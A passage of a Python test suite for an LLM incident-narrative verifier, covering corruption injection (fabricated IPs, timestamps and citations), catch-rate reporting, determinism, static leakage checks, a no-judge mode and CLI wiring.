            assert c["text"] == b.text and c["cites"] != b.cites
        if t == "fabricated_entity":
            assert any(x in c["text"] for x in ("192.0.2.99", "malware.example.net", "/var/tmp/.cache_dump.tar"))
        v = vr.det(data.ctxs[c["unit"]], c["text"], c["cites"], 0, 0, "llm", False)
        if t in ("ip_digit_drop", "ip_swap", "time_shift", "number_change", "cite_nonexistent", "cite_foreign_stage",
                 "cite_padding"):
            assert not v.det_passed(), (t, c["text"], c["cites"])
    other = candidates(data, bases)[t]  # a different seed gives a different (or at least independent) draw path
    assert isinstance(other, list)


def test_corruption_seed_changes_choices(prepared, tmp_path):
    data, bases = corruption_env(prepared, tmp_path)
    a = candidates(data, bases, seed=1)["cite_foreign_stage"]
    b = candidates(data, bases, seed=2)["cite_foreign_stage"]
    assert a != b


def test_corruption_run_cap_report_and_controls(prepared, tmp_path):
    data, bases = corruption_env(prepared, tmp_path)
    verified = {"stages": [{"stage": b.unit, "sentences": [{"text": b.text, "cites": b.cites, "source": "llm", "attempt": 0}]}
                           for b in bases], "executive_summary": []}
    sel = select(candidates(data, bases), 5)
    assert len(sel) == 5 and len({s["type"] for s in sel}) == 5  # spread across types
    assert select(candidates(data, bases), 5) == sel
    rep = run_corruption(data, verified, Judge(FJudgeLLM()), cap=40)
    assert rep["overall"]["injected"] <= 40 and set(rep["per_type"]) == set(TYPES)
    assert {"overall", "control", "missed", "per_type", "samples", "seed", "cap", "judge_mode"} <= set(rep)
    for t, p in rep["per_type"].items():
        assert p["injected"] == p["caught_deterministic"] + p["caught_judge_only"] + p["caught_judge_error"] + p["missed"]
    # with a judge that always says supported, only the deterministic layers can catch things
    assert rep["overall"]["caught_judge_only"] == 0
    for t in ("ip_digit_drop", "ip_swap", "time_shift", "number_change", "cite_nonexistent", "cite_foreign_stage"):
        p = rep["per_type"][t]
        if p["injected"]:
            assert p["catch_rate"] == 1.0
    assert rep["control"]["count"] == 3 and rep["control"]["rejected"] == 0 and rep["control"]["false_rejection_rate"] == 0.0
    assert all(m["type"] in TYPES and m["corrupted_text"] is not None for m in rep["missed"])
    assert (data.out_dir / "corruption_report.json").exists()
    small = run_corruption(data, verified, Judge(FJudgeLLM()), cap=7)
    assert small["overall"]["injected"] == 7


def test_corruption_missed_are_listed_and_judge_catches(prepared, tmp_path):
    data, bases = corruption_env(prepared, tmp_path)
    verified = {"stages": [{"stage": b.unit, "sentences": [{"text": b.text, "cites": b.cites, "source": "llm", "attempt": 0}]}
                           for b in bases], "executive_summary": []}
    from evidenceweave.verifier.corruption import FAKE_CLAIMS
    strict = lambda u: '{"verdict":"unsupported","reason":"no"}' if any(c in u for c in FAKE_CLAIMS) \
        else '{"verdict":"supported","reason":"ok"}'
    rep = run_corruption(data, verified, Judge(FJudgeLLM(strict)), cap=70)
    p = rep["per_type"]["fabricated_claim_no_entity"]
    assert p["injected"] == 3 and p["caught_judge_only"] == 3 and p["catch_rate"] == 1.0
    lazy = run_corruption(data, verified, Judge(FJudgeLLM()), cap=70)
    assert lazy["per_type"]["fabricated_claim_no_entity"]["missed"] == 3
    assert {m["type"] for m in lazy["missed"]} >= {"fabricated_claim_no_entity"}
    assert all("original_text" in m and "corrupted_text" in m for m in lazy["missed"])


# ================= 12. determinism =================
def strip(o):
    drop = {"created_at", "total_seconds", "seconds", "seconds_per_phase", "narrator_seconds"}
    if isinstance(o, dict):
        return {k: strip(v) for k, v in o.items() if k not in drop}
    return [strip(x) for x in o] if isinstance(o, list) else o


def test_determinism(prepared, tmp_path):
    h = lambda s, u, n: bad(u) if stage_of(u) == "persistence" and not fb(u) else None
    runs = []
    for i in (1, 2):
        res, *_ = run_verify(prepared, tmp_path / str(i), handler=h)
        d = tmp_path / str(i) / "case01"
        runs.append([json.dumps(strip(json.loads((d / f).read_text())), sort_keys=True)
                     for f in ("narrative_verified.json", "verification_report.json")])
    assert runs[0] == runs[1]


# ================= 13. static checks =================
def test_static_no_answer_key_and_no_generator_import():
    pkg = Path(__file__).parent.parent / "evidenceweave"
    for p in pkg.rglob("*.py"):
        if "generator" in p.parts:
            continue
        assert "answer_key" not in p.read_text(encoding="utf-8"), p
    for p in (pkg / "verifier").glob("*.py"):
        src = p.read_text(encoding="utf-8")
        assert not re.search(r"(from|import)\s+[\w.]*generator", src), p
        assert "203.0.113" not in src and "198.51.100" not in src and "svc_backup" not in src, p


# ================= 14. --no-judge =================
def test_no_judge_mode(prepared, tmp_path):
    h = lambda s, u, n: bad(u) if stage_of(u) == "persistence" and not fb(u) else None
    res, narr, jllm, seq, data, msgs = run_verify(prepared, tmp_path, handler=h, use_judge=False)
    ver, sm = res["verified"]["verification"], res["report"]["summary"]
    assert jllm.calls == [] and "judge" not in seq
    assert ver["judge_mode"].startswith("deterministic_only") and ver["judge_model"] is None
    assert all(c["kind"] == "narrator" for c in res["report"]["call_log"]) and sm["sentences_reaching_judge"] == 0
    assert sm["ablation_attempt0"] == {"total": 7, "deterministic_only_accepted": 6, "with_judge_accepted": None}
    assert sm["model_swaps"] == 0 and persist_ok(res)
    assert not any("WARNING" in m for m in msgs)


def persist_ok(res):
    return stage_entry(res, "persistence")["accepted"] == 1


def test_ablation_block_with_judge(prepared, tmp_path):
    j = lambda u: '{"verdict":"partial","reason":"x"}' if "brute" in u.lower() or "first logged event" in u else None
    res, *_ = run_verify(prepared, tmp_path, judge_handler=j)
    ab = res["report"]["summary"]["ablation_attempt0"]
    assert ab["total"] == 7 and ab["deterministic_only_accepted"] == 7 and ab["with_judge_accepted"] == 0


# ================= CLI wiring =================
def test_cli_verify_all_with_fakes(prepared, tmp_path, monkeypatch):
    def factory(model, num_ctx=8192, schema=None, validator=None, **kw):
        return FJudgeLLM(None, model) if schema is not None else FNarr(None, model)

    monkeypatch.setattr(llm_mod, "OllamaClient", factory)
    EVS.clear()
    EVS.update(load_events(prepared / "out" / "case01" / "events.jsonl"))
    cli.main(["verify", "--case-dir", str(prepared / "cases" / "case01"), "--mode", "all", "--out", str(tmp_path),
              "--model", "narr", "--judge-model", "jdg", "--chunk-size", "120", "--narration-mode", "raw"])
    d = tmp_path / "case01"
    for f in ("narrative.json", "narrative_verified.json", "verification_report.json", "baseline_narrative.json",
              "baseline_verification.json", "corruption_report.json"):
        assert (d / f).exists(), f
    ver = json.loads((d / "narrative_verified.json").read_text())["verification"]
    assert ver["narrator_model"] == "narr" and ver["judge_model"] == "jdg" and ver["judge_independent"]
    cli.main(["verify", "--case-dir", str(prepared / "cases" / "case01"), "--mode", "chain", "--out", str(tmp_path),
              "--model", "narr", "--no-judge", "--narration-mode", "raw"])
    assert json.loads((d / "verification_report.json").read_text())["verification"]["judge_mode"].startswith("deterministic_only")
